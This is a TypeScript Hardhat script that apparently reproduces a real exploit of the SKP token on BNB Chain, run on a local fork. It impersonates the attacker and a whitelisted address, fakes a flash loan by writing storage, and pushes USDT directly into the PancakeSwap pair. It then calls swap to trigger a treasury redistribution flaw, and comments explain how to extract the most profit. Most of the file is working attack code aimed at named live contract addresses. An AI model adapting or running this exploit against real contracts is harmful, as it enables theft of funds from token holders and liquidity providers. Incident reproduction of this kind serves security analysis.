/**
 * SKP redistribution analysis script.
 *
 * PURPOSE
 * ───────
 * Verifies the core redistribution mechanism BEFORE committing to the full
 * router-based Phase 2.  Specifically, this script confirms:
 *
 *   1. Direct USDT transfer → pair inflates USDT balance vs stored reserve.
 *   2. pair.swap(0, tinyAmount, WL, "0x") succeeds when recipient == WL_ADDRESS.
 *   3. _runSpecialPairFlow() redistributes an enormous amount of SKP from
 *      the SKP treasury to WL (NOT from the pair's own balance).
 *
 * KEY FINDING (from this script's output)
 * ─────────────────────────────────────────
 *   After requesting only 1 SKP from the pair, WL received 9,678,739,566 SKP.
 *   The pair's SKP balance remained at 21,574,107 (−1 wei, as expected for the
 *   direct swap).  This proves the redistribution source is the SKP treasury,
 *   not the pair.  The exploit does not require draining the pair's own SKP
 *   reserve — it collects free treasury tokens and sells them at distorted prices.
 *
 * WHY THIS DIFFERS FROM THE FINAL TEST
 * ─────────────────────────────────────
 *   This script transfers USDT DIRECTLY to the pair (not via router).  With a
 *   direct deposit the router never calls pair.swap(); we call it ourselves.
 *   The K-check for a tiny 1-SKP output with 204.95M USDT deposited passes:
 *     LHS = (205M×1000 − 204.95M×3) × (21.57M×1000) ≈ 4.41×10^21
 *     RHS = 234K × 21.57M × 10^6                     ≈ 5.05×10^15
 *     LHS >> RHS ✓
 *   So pair.swap(0, 1SKP, WL, "0x") succeeds even without router calculations.
 *
 *   The final test uses the router because it correctly calculates the maximum
 *   SKP the attacker can extract in Phase 2 (~21.55M), which maximises profit.
 *
 * USAGE
 * ─────
 *   npx hardhat run scripts/debug_skp9.ts --network hardhat
 */

import { ethers } from "hardhat";

// ── Addresses ─────────────────────────────────────────────────────────────────
const SKP  = "0xecbdc0b76142740bb564b8aa1bcd061cb151a666"; // vulnerable token
const USDT = "0x55d398326f99059ff775485246999027b3197955"; // BSC-USD
const PAIR = "0x47c8c3b123de467892ac7df6dfcf7ca3db901733"; // SKP/USDT PancakeSwap V2 pair

/** Whitelisted buyer — only address allowed to receive SKP transfers from the pair */
const WL  = ethers.getAddress("0x646f7bb10d81ff9734510d4e7583eb5247b28743");

/** The real attacker's EOA — used only as a USDT source here */
const EOA = ethers.getAddress("0x83b9e7edc5b3127e4853a4f4945b92aa88eef0c8");

// ── Minimal ABIs ──────────────────────────────────────────────────────────────
const ERC20 = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address,uint256) returns (bool)",
  "function approve(address,uint256) returns (bool)",
];
const PAIR_ABI = [
  "function getReserves() view returns (uint112,uint112,uint32)",
  "function swap(uint256,uint256,address,bytes) external",
  "function sync() external",
];

async function main() {
  // ── Hardhat EDR workaround (see hardhat.config.ts for explanation) ─────────
  await ethers.provider.send("evm_mine", []);

  // Impersonate both the attacker EOA (to move USDT) and WL (to receive SKP).
  await ethers.provider.send("hardhat_impersonateAccount", [EOA]);
  await ethers.provider.send("hardhat_impersonateAccount", [WL]);
  await ethers.provider.send("hardhat_setBalance", [EOA, "0x56BC75E2D63100000"]); // 100 BNB
  await ethers.provider.send("hardhat_setBalance", [WL,  "0x56BC75E2D63100000"]); // 100 BNB

  // ── Simulate flash loan: write USDT directly to EOA's balance slot ─────────
  // BSC-USD _balances mapping is at storage slot 1 (not the OZ default slot 0).
  // Key = keccak256(abi.encode(EOA, 1))
  const USDT_TO_PAIR = 204_950_260_192_546_830_212_787_938n;
  const balSlot = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [EOA, 1n])
  );
  await ethers.provider.send("hardhat_setStorageAt", [
    USDT,
    balSlot,
    ethers.zeroPadValue(ethers.toBeHex(USDT_TO_PAIR), 32),
  ]);

  const eoaSigner = await ethers.getSigner(EOA);
  const usdt = new ethers.Contract(USDT, ERC20, eoaSigner);
  const pair = new ethers.Contract(PAIR, PAIR_ABI, eoaSigner);

  // ── Step 1: push 204.95M USDT into the pair without swapping ──────────────
  // This creates an artificial USDT excess (balance >> reserve) identical to
  // what the router would create in Step (a) of the real attack.
  console.log("Depositing USDT directly into pair...");
  await usdt.transfer(PAIR, USDT_TO_PAIR);

  const [r0_b, r1_b]  = await pair.getReserves();
  const pairUsdtBal    = await (new ethers.Contract(USDT, ERC20, ethers.provider)).balanceOf(PAIR);
  const pairSkpBal_pre = await (new ethers.Contract(SKP,  ERC20, ethers.provider)).balanceOf(PAIR);

  console.log(`Pair USDT reserve  : ${ethers.formatUnits(r0_b, 18)}`);
  console.log(`Pair USDT balance  : ${ethers.formatUnits(pairUsdtBal, 18)}`);
  console.log(`Pair USDT excess   : ${ethers.formatUnits(pairUsdtBal - r0_b, 18)}`);
  console.log(`Pair SKP reserve   : ${ethers.formatUnits(r1_b, 18)}`);
  console.log(`Pair SKP balance   : ${ethers.formatUnits(pairSkpBal_pre, 18)}`);

  // ── Step 2: call pair.swap(0, 1 SKP, WL, "0x") ────────────────────────────
  //
  // We request only 1 SKP to confirm:
  //   (a) The whitelist allows WL as recipient (no "cannot buy or remove lp" revert)
  //   (b) The K-check passes with a tiny SKP output and huge USDT deposited
  //   (c) _runSpecialPairFlow fires and redistributes treasury SKP to WL
  //
  // Note: passing ATTACKER_EOA (EOA) as the recipient would fail — this was one
  // of the first errors hit during debugging.
  const tinySkp = ethers.parseUnits("1", 18); // 1 full SKP token
  console.log("\nCalling pair.swap(0, 1 SKP, WL, 0x)...");
  try {
    await pair.swap(0n, tinySkp, WL, "0x");
    console.log("pair.swap() SUCCESS");
  } catch (e: any) {
    console.log("pair.swap() FAILED:", e.message.slice(0, 120));
  }

  // ── Step 3: read state after swap ─────────────────────────────────────────
  const [r0_a, r1_a]  = await pair.getReserves();
  const pairSkpBal     = await (new ethers.Contract(SKP,  ERC20, ethers.provider)).balanceOf(PAIR);
  const wlSkpBal       = await (new ethers.Contract(SKP,  ERC20, ethers.provider)).balanceOf(WL);

  console.log("\n=== After swap ===");
  console.log(`Pair USDT reserve  : ${ethers.formatUnits(r0_a, 18)}`);
  // Expected: pair USDT reserve updated to ~205M by _update() inside swap()
  console.log(`Pair SKP reserve   : ${ethers.formatUnits(r1_a, 18)}`);
  // Expected: ~21,574,107 (almost unchanged — we only took 1 SKP directly)
  console.log(`Pair SKP balance   : ${ethers.formatUnits(pairSkpBal, 18)}`);
  // Expected: matches reserve (redistribution came from treasury, not pair balance)
  console.log(`WL SKP balance     : ${ethers.formatUnits(wlSkpBal, 18)}`);
  // Expected: ~9,678,739,566 SKP — the free treasury redistribution
  // This is ~448× MORE than the entire pair's original SKP reserve.
  // The excess came from the SKP contract's treasury, not from the pair.
}

main().catch(console.error);
